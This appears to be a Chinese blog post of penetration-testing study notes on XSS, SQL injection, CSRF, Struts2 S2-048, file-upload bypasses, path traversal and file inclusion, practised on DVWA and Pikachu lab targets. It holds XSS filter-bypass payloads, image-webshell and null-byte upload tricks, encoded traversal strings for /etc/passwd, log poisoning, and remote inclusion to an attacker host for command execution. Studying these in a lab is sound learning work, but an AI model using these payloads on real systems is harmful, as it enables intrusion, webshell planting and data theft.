---
  title: 安全-渗透学习-待整理
date: 2020-03-28 21:11:55
tags:
	- 安全
	- 杂
typora-root-url: ./

---

# 反射性XSS

**跨站脚本攻击(Cross Site Scripting)**。XSS分为**反射型XSS，存储型XSS和DOM型XSS**。反射型XXS是一种**非持久性**的攻击，它指的是恶意攻击者往Web页面里插入恶意代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的目的。这里插入的恶意代码并没有保存在目标网站，需要引诱用户点击一个链接到目标网站的恶意链接来实施攻击。

![10976729-63e28ea411ca8edc](/blog.github.io/images/10976729-63e28ea411ca8edc.jpg)

**XSS攻击分类:**

XSS漏洞一般有两种类型攻击。

a)一类是来自内部的攻击，主要指的是利用WEB程序自身的漏洞，提交特殊的字符串，从而使得跨站页面直接存在于被攻击站点上，这个字符串被称为跨站语句。这一类攻击所利用的漏洞非常类似于SQL Injection漏洞，都是WEB程序没有对用户输入作充分的检查和过滤。

b)另一类则是来来自外部的攻击，主要指的自己构造XSS跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个跨站网页放在自己的服务器上，然后通过结合其它技术，如社会工程学等，欺骗目标服务器的管理员打开。这一类攻击的威胁相对较低。

**执行例子：**

1、未作任何校验的网站，输入恶意代码，弹出弹框：

`<script>alert('chenie')</script>`

![image-20200328165842263](/blog.github.io/images/image-20200328165842263.png)

2、加入了一些过滤，`preg_replace()`函数如果检测到`<script>`和`</script>`就会把其替换为空格(区分大小写，只替换小写的)。所以这里可以双写绕过也可以大小写绕过。即payload:

`<scr<script>ipt>alert('chenie')</s</script>cript>`

或

`<scRipt>alert('chenie')</scRipt>`都可以绕过过滤进行XSS。

3、用双写绕过

`<scr<script>ipt>alert('chenie')`

4、使用img标签来绕过,img src调用图片失败然后执行后面的动作。payload为:

`<img src=""onclick="alert('chenie')">`

5、用编码来绕过了, payload为

`<script>eval(String.fromCharCode(97,108,101,114,116,40,39,99,104,101,110,105,101,39))</script>`

6、通过构造js脚本使标签闭合然后加入新标签,payload为

`</script><script>alert('chenie')</script>`

7、使用单引号绕过，尝试构造语句如下：

`';alert('chenie');'`

8、当测试提交一个地址的时候源码会显示出来一个链接，链接就是输入的链接，关键代码如上，payload为

`http://192.168.1.3:8080/xss3/xss/example8.php/[/url]"><script>alert('chenie')</script>"< "`

9、XSS直接在页面输出锚点id，构建一个带xss的锚点即可，payload为

`http://192.168.1.3:8080/xss3/xss/example9.php#alert(‘chenie’)</script)>`。

刷新网页后，即可弹窗



# 火狐配置

18个扩展让你的Firefox成为渗透测试工具                                

https://www.freebuf.com/sectool/11544.html?replytocom=52007

https://blog.csdn.net/qq_37865996/article/details/85564334

# sql注入

![image-20200401211603623](/blog.github.io/images/image-20200401211603623.png)

https://www.cnblogs.com/hzk001/p/12069553.html

# dvwa

DVWA默认的用户有5个，用户名密码如下（一个足以）：

admin/password

gordonb/abc123

1337/charley

pablo/letmein

smithy/password

**获取用户名密码：**

sql盲注：https://blog.csdn.net/qq_37865996/article/details/85564334

**dvwa用户名密码重置：**Database Setup重置数据库



# CSRF跨站请求伪造

![1539764806_5bc6f2465902f](/blog.github.io/images/1539764806_5bc6f2465902f.jpg)

解决及使用方法：

1、关闭标签，cookie要过期

2、dvwa中的使用，打开csrf页面，修改密码，复制网址，修改password，并在另一个tab页中执行，密码修改为后一个密码；退出登录后，再执行网址，修改不成功

https://www.mochoublog.com/study/246.html



# nmap

nmap是收集信息的第一步的使用工具

![d0c8a786c9177f3eb3256e8e814c6bc29e3d56ad](/blog.github.io/images/d0c8a786c9177f3eb3256e8e814c6bc29e3d56ad.png)



# sql注入

select first_name,surname from XXX where ID=‘1’;

1、先判断是否有注入点

2、判断是数字型还是字符型：输入'，报错，可以判断是字符型注入

3、通过order by  1,2,3 #，判断列数   ，#对后面的sql语句进行截断

4、通过union 进行联合查询，进行外显

5、MySQL 用select查表名  select table_name from information_schema.tables where table_schema='当前数据库'

 sql注入工具：**sqlmap**

**fiddler 抓包工具**



# Struts2 漏洞

## 漏洞编号

CVE-2017-9791

S2-048

## 安装环境

需要有war包struts2-showcase

下载官方地址：https://archive.apache.org/dist/struts/2.3.32/

2、将下载使用app中的war包，放到Apache Tomcat的C:\Tomcat 7.0\webapps目录下，重启服务即可使用

3、访问网址：http://locallhost:8080/struts2-showcase/integration/editGangster.action

4、判断漏洞是否存在：https://blog.csdn.net/qq1124794084/article/details/77891998?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-5&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-5

输入${9/3}，查看是否被执行

## 漏洞影响

使用 Struts 1 plugin 和 Struts 1 action 的Struts 2.3.x

## 漏洞概述

Apache Struts是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级Java Web应用的开源MVC框架。在Struts 2.3.x 系列的 Showcase 应用中演示Struts2整合Struts 1 的插件中存在一处任意代码执行漏洞。当你的应用使用了Struts2 Struts1的插件时，可能导致不受信任的输入传入到ActionMessage类中导致命令执行。

## 解决方案

1.不要启用Struts2-struts1-plugin插件；

2.不要使用showcase.war；

3.始终使用资源键，而不是将原始消息传递给ActionMessage，如下所示，而不要直接传递原始值：

```
messages.add("msg", new ActionMessage("struts1.gangsterAdded", gform.getName()));
```

而不是这样：

```
messages.add("msg", new ActionMessage("Gangster " + gform.getName() + " was added"));
```

# 测试过程中遇到的问题

1、使用工具测试时，请检查现在的环境配置是否正常

2、使用jar文件，前确定JDK已经安装

3、一般情况下，电脑文件后缀不要隐藏

# Jboss的java反序列漏洞

1、访问：XXX/invoker/readonly

2、页面出现：org.jboss.invocation.http.servlet.ReadOnlyAccessFilter.doFilter(ReadOnlyAccessFilter.java:102)

3、确定存在java反序列

4、使用工具，可以验证java反序列的危害

![image-20200504193832440](/blog.github.io/images/image-20200504193832440.png)

# 提权

网站的提权，依旧是一句话木马最为好用

需要注意的是，上传漏洞的利用，并不只是单纯的上传，还要考虑上传过程中的绕过问题

# 被Apache服务器解析成php文件

不管文件最后后缀为什么，只要是.php.*结尾，就会被Apache服务器解析成php文件

# [一文读懂Http Headers为何物(超详细)](https://segmentfault.com/a/1190000018234763)

我们打开chrome的network，点击任何一条request请求，即可发现，每个http headers都包含以下部分:Genaral，Request Headers，Response Headers，Request Payload。

General(不属于headers，只用于收集请求url和响应的status等信息)

Request Headers(请求headers)

Response Headers(响应headers)

Request Payload(请求参数)

1、Genaral headers: 同时适用于请求和响应消息，但与最终消息传输的数据无关的消息头。

2、Request Headers: 包含更多有关要获取的资源或客户端本身信息的消息头。

3、Response Headers：包含有关响应的补充信息，如其位置或服务器本身（名称和版本等）的消息头。

4、Entity Headers：包含有关实体主体的更多信息，比如主体长(Content-Length)度或其MIME类型。

![view](/blog.github.io/images/view)

# 文件上传漏洞

## 造成文件上传漏洞的原因是

1、对于上传文件的后缀名（扩展名）没有做较为严格的限制

2、对于上传文件的MIMETYPE 没有做检查

3、权限上没有对于上传的文件的文件权限，（尤其是对于shebang类型的文件）

4、对于web server对于上传文件或者指定目录的行为没有做限制

## 漏洞上传方法：

IIS6.0 的解析漏洞 ：1.jpg%00.php 1.asp;.jpg 1.asp/1.jpg

IIS 7.0/IIS 7.5/ Nginx <8.03 畸形解析 1.jpg/.php

Nginx <8.03 空字节代码执行漏洞 1.jpg%00.php

Apache 解析漏洞 .php.一个无效后缀

还有就是 Windows 下的各种截断了，因为 win 环境下不允许一些符号命名文件，所以可以造成截断文件名的效果，不过恕我直言，用 Windows 当服务器就是 sb...

### 1、前端绕过，上传可上传文件后，截包修改后缀

### 2、在一些 webserver 中，存在解析漏洞

1）老版本的IIS中的目录解析漏洞，如果网站目录中有一个 /.asp/目录，那么此目录下面的一切内容都会被当作asp脚本来解析

2）老板本的IIS中的分号漏洞：IIS在解析文件名的时候可能将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容来避免黑名单过滤，如 a.asp;jpg

3）旧版Windows Server中存在空格和dot漏洞类似于 a.php. 和 a.php[空格] 这样的文件名存储后会被windows去掉点和空格，从而使得加上这两个东西可以突破过滤，成功上传，并且被当作php代码来执行

4）nginx空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行

5）apache的解析漏洞，上传如a.php.rar a.php.gif 类型的文件名，可以避免对于php文件的过滤机制，但是由于apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar等扩展名是apache不能识别的，因此就会直接将类型识别为php，从而达到了注入php代码的目的

### 3、检查HTTP Header中的Content-Type

使用各种各样的工具（如burpsuite）强行篡改Header就可以，太容易将header中的

Content-Type: application/php

或者其他类型

Content-Type: image/jpg

Content-Type: image/png

Content-Type: text/plain

等这些web程序允许的泪洗改附上常用的MIMETYPE表

text/plain（纯文本）

text/html（HTML文档）

text/javascript（js代码）

application/xhtml+xml（XHTML文档）

image/gif（GIF图像）

image/jpeg（JPEG图像）

image/png（PNG图像）

video/mpeg（MPEG动画）

application/octet-stream（二进制数据）

application/pdf（PDF文档）

application/(编程语言) 该种语言的代码

application/msword（Microsoft Word文件）

message/rfc822（RFC 822形式）

multipart/alternative（HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示）

application/x-www-form-urlencoded（POST方法提交的表单）

multipart/form-data（POST提交时伴随文件上传的表单）

### 4、图片文件通常有称作幻数的头字节，我们来看一下几种图片文件的幻数：

（注意！下面是二进制而不是文本格式的数据）

JPG

FF D8 FF E0 00 10 4A 46 49 46

GIF

47 49 46 38 39 61

(相当于文本的GIF89a)

PNG

89 50 4E 47

通过检查头几位字节，可以分辨是否是图片文件

如果是其他类型的二进制文件，也有响应的头字节，如下表

反制

给上传脚本加上相应的幻数头字节就可以，php引擎会将 <?之前的内容当作html文本，不解释而跳过之，后面的代码仍然能够得到执行比如下面：

（一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符。）

GIF89a

<?php

do_something();

?>

如果是其他类型的二进制文件，也有响应的头字节，如下表

| 格式                       | 文件头               |
| -------------------------- | -------------------- |
| TIFF (tif)                 | 49492A00             |
| Windows Bitmap (bmp)       | 424D                 |
| CAD (dwg)                  | 41433130             |
| Adobe Photoshop (psd)      | 38425053             |
| Rich Text Format (rtf)     | 7B5C727466           |
| MS Word/Excel (xls.or.doc) | D0CF11E0             |
| MS Access (mdb)            | 5374616E64617264204A |
| ZIP Archive (zip)，        | 504B0304             |
| RAR Archive (rar)，        | 52617221             |
| Wave (wav)，               | 57415645             |
| AVI (avi)，                | 41564920             |
| Real Media (rm)，          | 2E524D46             |
| MPEG (mpg)，               | 000001BA             |
| MPEG (mpg)，               | 000001B3             |
| Quicktime (mov)，          | 6D6F6F76             |
| Adobe Acrobat (pdf)，      | 255044462D312E       |
| Windows Media (asf)，      | 3026B2758E66CF11     |
| MIDI (mid)，               | 4D546864             |

### 5.限制Web Server对于特定类型文件的行为

通过 move_uploaded_file 函数把自己写的.htaccess 文件上传，覆盖掉服务器上的文件，来定义文件类型和执行权限如果做到了这一点，将获得相当大的权限。

## 一句话木马上传常见的几种方法

1，利用00截断，brupsuite上传

利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生0X00上传截断漏洞。 

假设文件的上传路径为http://xx.xx.xx.xx/upfiles/lubr.php.jpg ,通过Burpsuite抓包截断将lubr.php后面的“.”换成“0X00”。在上传的时候，当文件系统读到”0X00″时，会认为文件已经结束，从而将lubr.php.jpg 的内容写到lubr.php中，从而达到攻击的目的。

2，构造服务器端扩展名检测上传

当浏览器将文件提交到服务器端的时候，服务器端会根据设定的黑名单对浏览器提交上来的文件扩展名进行检测，如果上传的文件扩展名不符合黑名单的限制，则不予上传，否则上传成功。 

本例讲解，将一句话木马的文件名lubr.php改成lubr.php.abc。首先，服务器验证文件扩展名的时候，验证的是.abc，只要改扩展名符合服务器端黑名单规则，即可上传。另外，当在浏览器端访问该文件时，Apache如果解析不了.abc扩展名，会向前寻找可解析的扩展名，即”.php”。一句话木马可以被解析，即可通过中国菜刀连接。

3，绕过Content-Type检测文件类型上传

当浏览器在上传文件到服务器端的时候，服务器对上传的文件Content-Type类型进行检测，如果是白名单允许的，则可以正常上传，否则上传失效。绕过Content-Type文件类型检测，就是用Burpsuite截取并修改数据包中文件的Content-Type类型，使其符合白名单的规则，达到上传的目的。

4，构造图片木马，绕过文件内容检测上传Shell

一般文件内容验证使用getimeagesize()函数检测，会判断文件是否一个有效的文件图片，如果是，则允许上传，否则的话不允许上传。

制作图片木马： copy 1.jpg/b+2.php/a 3.jpg

## dvwa实践

https://www.cnblogs.com/sallyzhang/p/11906217.html

我用DVWA的文件上传来做练习，low模式没有任何验证，随便上传任意大小和类型的文件，现实中一般不会存在，故跳过，从medium模式开始。

进入页面后，我尝试传一个php文件上去(文件中有一段代码，用来列出上级目录的所有文件)，下图说明medium模式对文件类型进行了限制(在做这个练习此之前，我觉得做了类型限制就很安全了，反正其他类型都传不上去嘛~)，其实有一些方法可以绕过这种检测。

![img](/blog.github.io/images/832604-20191121154110169-1762395477.png)

 

### 修改Content-Type绕过文件类型检测(medium模式)

用Burp Suite抓包如下，content-type的类型是octet-stream。根据页面的报错，这个页面只能传jpg和png格式的图片。

![img](/blog.github.io/images/832604-20191121155432052-1363568961.png)

尝试把请求中content-type改为image/jpeg，再次发送请求，上传成功。说明medium模式只验证了Mime-Type，并没有验证文件本身(我传的还是php文件)

![img](/blog.github.io/images/832604-20191121155802522-780541502.png)

上传成功后访问3.php，代码被执行（**恶意代码被执行的风险有多大不用多说了**。。。）

![img](/blog.github.io/images/832604-20191121160947698-1523102346.png)

### 利用图片马绕过(high模式)

将security level修改为high，再次使用修改content-type的方法上传，发现上传失败，也就是说，high模式校验了上传文件本身到底是不是图片。接下来尝试用图片马来绕过。什么是图片马，简单来说就是在图片中嵌入了代码。。。步骤如下：

\1. 合成图片马

  找到一张货真价实的图片，然后将图片和php文件合成另一张图片，在命令行使用如下命令：

  copy 3.png /b + test.php /a y.png  (y.png就是图片马)

\2. 上传图片马

  用Burp Suite抓包看到我们的代码已经隐藏在图片里了，然后直接上传即可(因为文件格式是符合要求的)

  ![img](/blog.github.io/images/832604-20191121160805243-2090309796.png)

### 利用GIF89a绕过(high模式)

什么是GIF89a呢？先上传一张货真价实的gif图片，抓包如下图，图片的最开始几个字母就是GIF89a。个人理解GIF89a应该是gif文件的开头标志，只要有这个标志，就会被当做gif图片~

![img](/blog.github.io/images/832604-20191121161608362-449770532.png)

我将本地的php文件开头加上gif89a，然后把文件重命名为.jpg，进行上传并上传成功（实际上我上传的是一段代码）

**这里有个疑问**：明明只允许上传jpeg和png，为何gif图片也上传了呢？我的理解是：文件类型和后缀名是分开校验的。校验文件类型的函数只校验了是否是图片(没管是什么类型的图片)，而jpeg和png的校验只校验了后缀名。

![img](/blog.github.io/images/832604-20191121161958219-1406589924.png)

 

那有没有办法避免这种情况呢？有，把security level修改为impossible模式，图片马和GIF89a都不行了，因为impossible模式在high的基础上，还检测了上传文件是不是货真价实的图片~

## pikaqiu靶机上传漏洞

1、客户端check：仅做了前台校验

方法：

1）上传PHP修改过后缀的文件（phpinfo.php 1.jpg），burp截包，修改文件名为：phpinfo.php，修改成功

2）修改hex中phpinfo.php 1.jpg中的值，将空格（20）修改为（00），进行截断，上传成功

2、服务端check（仅MIME type校验）

方法：

1）同问题1解决方法

2）由于前台无校验，直接上传php文件（phpinfo.php），burp截包，修改Content-Type类型为Content-Type: image/jpeg，上传成功

3、getimagesize()

方法：初步估计，采用制作木马图片

# 目录遍历漏洞概述

 在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。                      

看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。                    

需要区分一下的是,如果你通过不带参数的url（比如：http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。 而并不归为目录遍历漏洞。（关于敏感信息泄露你你可以在"i can see you ABC"中了解更多）你可以通过“../../”对应的测试栏目，来进一步的了解该漏洞。 

## pikaqiu靶机实践                   

![image-20200902215534791](/blog.github.io/images/image-20200902215534791.png)

### (1) 加密参数传递的数据；

在Web应用程序对文件名进行加密之后再提交，比如：“downfile.jsp?filename= ZmFuLnBkZg- “，在参数filename用的是Base64加密，而攻击者要想绕过，只需简单的将文件名加密后再附加提交即可。所以说，采用一些有规律或者轻易能识别的加密方式，也是存在风险的。

### (2) 编码绕过，

尝试使用不同的编码转换进行过滤性的绕过，比如Url编码，通过对参数进行Url编码提交，“downfile.jsp?filename= %66%61%6E%2E%70%64%66“来绕过。

### (3) 目录限定绕过；

在有些Web应用程序是通过限定目录权限来分离的。当然这样的方法不值得可取的，攻击者可以通过某些特殊的符号“~“来绕过。形如这样的提交“downfile.jsp?filename=~/../boot”。能过这样一个符号，就可以直接跳转到硬盘目录下了。

### (4) 绕过文件后缀过滤；

一些Web应用程序在读取文件前，会对提交的文件后缀进行检测，攻击者可以在文件名后放一个空字节的编码，来绕过这样的文件类型的检查。
例如：../../../../boot.ini%00.jpg，Web应用程序使用的Api会允许字符串中包含空字符，当实际获取文件名时，则由系统的Api会直接截短，而解析为“../../../../boot.ini”。
在类Unix的系统中也可以使用Url编码的换行符，例如：../../../etc/passwd%0a.jpg如果文件系统在获取含有换行符的文件名，会截短为文件名。也可以尝试%20，例如: ../../../index.jsp%20

### (5) 绕过来路验证。

Http Referer : HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的

在一些Web应用程序中，会有对提交参数的来路进行判断的方法，而绕过的方法可以尝试通过在网站留言或者交互的地方提交Url再点击或者直接修改Http Referer即可，这主要是原因Http Referer是由客户端浏览器发送的，服务器是无法控制的，而将此变量当作一个值得信任源是错误的。

## 防范遍历路径漏洞

在防范遍历路径漏洞的方法中，最有效的是权限的控制，谨慎的处理向文件系统API传递过来的参数路径。主要是因为大多数的目录或者文件权限均没有得到合理的配置，而Web应用程序对文件的读取大多依赖于系统本身的API，在参数传递的过程，如果没有得严谨的控制，则会出现越权现象的出现。在这种情况下，Web应用程序可以采取以下防御方法，最好是组合使用。
(1) 数据净化对网站用户提交过来的文件名进行硬编码或者统一编码，对文件后缀进行白名单控制，对包含了恶意的符号或者空字节进行拒绝。
(2) Web应用程序可以使用chrooted环境访问包含被访问文件的目录，或者使用绝对路径+参数来控制访问目录，使其即使是越权或者跨越目录也是在指定的目录下。

## 总结

路径遍历漏洞允许恶意攻击者突破Web应用程序的安全控制，直接访问攻击者想要的敏感数据 ，包括配置文件、日志、源代码等，配合其它漏洞的综合利用，攻击者可以轻易的获取更高的权限，并且这样的漏洞在发掘上也是很容易的，只要对Web应用程序的读写功能块直接手工检测，通过返回的页面内容来判断，是很直观的，利用起来也相对简单。

## 还有一种目录遍历 那就是因为这个web服务器的配置不当造成的

index of /

我们可以直接利用百度语法来寻找此形式的目录遍历漏洞

intitle:index of

## **目录遍历漏洞：**

**应用程序如果有操作文件的功能，限制不严格会导致可以访问到WEB目录意外的文件**

目录遍历漏洞和文件包含漏洞本质以及利用方法一样

一定要论区别的话：

**目录遍历：对本操作系统的文件进行读取**

**文件包含：1:LFI本地文件包含，和目录遍历一致；2:RFI远程文件包含**

漏洞原因：目录权限限制不严格

### 漏洞利用示例：

启动Metasploitable靶机：192.168.163.129

启动Kali机器：192.168.163.132

 

在DVWA的这个目录存在文件包含漏洞：本地文件包含

![img](/blog.github.io/images/1312707-20181122122837602-2091062644.png)

 

我们可以在Metasploitable中修改配置文件以开启远程文件包含漏洞：

sudo vi /etc/php5/cgi/php.ini

然后输入/allow_url进行搜索：找到这里，修改成On

![img](/blog.github.io/images/1312707-20181122124418190-866071858.png)

然后重启Apache服务：

sudo /etc/init.d/apache2 restart

这时候Metasploitable就会存在远程文件包含漏洞了

 

### 目录遍历漏洞的特征要注意：

?page=xxx.php

?home=xxx.html

?index=xxx.jsp

?file=content

 

### 常用漏洞验证方式：

#### 1：../../../../../../（多少个../都行，越多越好）/etc/passwd

![img](/blog.github.io/images/1312707-20181122125924263-1282240920.png)

 

URL上这一串东西的意义：../返回上级目录，当返回到根目录时候再../还是根目录，然后直接进入linux系统的passwd文件

 

#### 2.file:///etc/passwd（这里是文件包含漏洞，不过利用方法一致）

![img](/blog.github.io/images/1312707-20181122130527658-1607236601.png)

 

#### 3.http://xxxxx

![img](/blog.github.io/images/1312707-20181122130838887-1451696930.png)

 

前两者用途：可以读取到目标系统的机密文件

远程文件包含用途：可以构建一个带有shellcode的网站，使目标访问，进而得到shell（虽然是低权限shell）

 

###  **注意事项：**

1.有时候?page=../../../etc/passwd，显示找不到passwd.php文件，这是目标系统开启了过滤机制

绕过办法：PHP5.3版本以前的，可以用一个空字符%00来解决，示例：

?page=../../../etc/passwd%00

这时候就算目标机器补上一个.php，也无所谓

 

2.有的服务器会过滤非法字符，比如/\$&.*等，我们可以采用一些编码来处理

路径方面，linux一定是/，windows通常是\，但有可能是/，实际中可以多次发送根据结果来得到答案

编码方面：示例

URL编码：

../   %2e%2e%2f

..\   %2e%2e%5c

..\   %252e%252e%255c (双层URL编码)

 

Unicode/UTF-8编码：

../   ..%c0%af   ..%u2216  

..\   ..%c1%9c

 

编码工具：之前介绍的很多工具都有，我用Burp来举例

![img](/blog.github.io/images/1312707-20181122133015851-1125383547.png)

 

可以用URL编码后的字符做尝试：成功

![img](/blog.github.io/images/1312707-20181122133210352-467797778.png)

 

![img](/blog.github.io/images/1312707-20181122134458649-191668887.png)

 

上边说到本地文件包含来查看文件内容

**通常认为本地文件包含漏洞无法执行代码**

万事没有绝对，有极其特殊的方式可以执行代码

**比如：利用访问日志**

当我们访问一个WebServer例如Apache时候，就会有访问日志

会记录下来访问IP和访问的URL等一些简单的信息

我们用nc连接到目标的80端口：发送一段这样的东西

 ![img](/blog.github.io/images/1312707-20181122141734563-3569581.png)

 

然后会在apache的日志中插入一段php代码：然后对日志文件chmod，改为可执行权限

如果失败了的话，多层chmod，使访问目录的所有层都赋予权限，然后利用文件包含，有机会执行代码（不一定成功）

 

### **远程文件包含示例：**

我先用NC侦听本地80端口：

![img](/blog.github.io/images/1312707-20181122143815332-62297210.png)

 

远程文件包含到Kali机器：这是输入Kali的IP，至于URL随便写

![img](/blog.github.io/images/1312707-20181122144007682-1299164782.png)

 

然后一直显示连接状态

查看NC，发现收到了连接请求：

![img](/blog.github.io/images/1312707-20181122144141057-1872866535.png)

 

nc只是获得了连接请求，实际没用

下面展示实际使用方式

利用Kali本机的Apache服务

到/var/www/html目录下，新建文本 1.txt，写入上边的php代码（或者搞个木马脚本都行，这里为了方便）

![img](/blog.github.io/images/1312707-20181122150243793-1463425658.png)

 

保存之后开启Apache服务

![img](/blog.github.io/images/1312707-20181122150430950-1173938752.png)

 

然后测试：

![img](/blog.github.io/images/1312707-20181122150717616-874695890.png) 

 

成功执行了ls命令

到这一步就相当于拿到了shell

 

最后：

我们可以查看DVWA这里的远程文件包含的源码：

LOW级别：直接获取文件名

```
 <?php

    $file = $_GET['page']; //The page we wish to display 

?> 
```

 

MEDIUM级别：过滤特殊字符，导致无法远程文件包含

解决方法：编码

比如http://192.168.163.132======>%68%74%74%70%3a%2f%2f192.168.163.132

如果失败，就可以只针对http://中的某个字符，比如/进行编码

如果还是失败，可以进行一种巧妙的方法

**非常经典的关键字绕过方法：**

**hthttp://tp://192.168.163.132**

我在一个http://中插入了一个http://，**服务器只会识别一次**，如果两个分开写都会被过滤，**穿插来写**，只会过滤一个

[![复制代码](/blog.github.io/images/copycode.gif)](javascript:void(0);)

```
 <?php

    $file = $_GET['page']; // The page we wish to display 

    // Bad input validation
    $file = str_replace("http://", "", $file);
    $file = str_replace("https://", "", $file);        


?> 
```

[![复制代码](/blog.github.io/images/copycode.gif)](javascript:void(0);)

HIGH级别：规定写死，只能包含include.php

这种方式基本无解了，没有漏洞，或者我水平低下找不到漏洞

[![复制代码](/blog.github.io/images/copycode.gif)](javascript:void(0);)

```
 <?php
        
    $file = $_GET['page']; //The page we wish to display 

    // Only allow include.php
    if ( $file != "include.php" ) {
        echo "ERROR: File not found!";
        exit;
    }
        
?> 
```

[![复制代码](/blog.github.io/images/copycode.gif)](javascript:void(0);)

总结：

远程文件包含漏洞出现概率远远小于本地文件包含漏洞

但是远程文件包含漏洞更容易被利用

# 御剑后台路径扫描

![image-20201022223645139](/blog.github.io/images/image-20201022223645139.png)

目录扫描：扫描站点的目录，寻找敏感文件（目录名、探针文件、后台、robots.txt【】、备份文件等）

目录：站点结构，权限控制不严格

探针文件：服务器配置信息，phpinfo.php  readme.txt  config.txt

后台：管理整个网站的入口，inurl:admin.php

robots.txt：一般存放在站点根目录，如果管理员对robos.txt文件不合理就会造成信息泄露。

备份文件：数据库备份、网站备份文件等 .bak  .zip  [www.rar](http://www.rar/)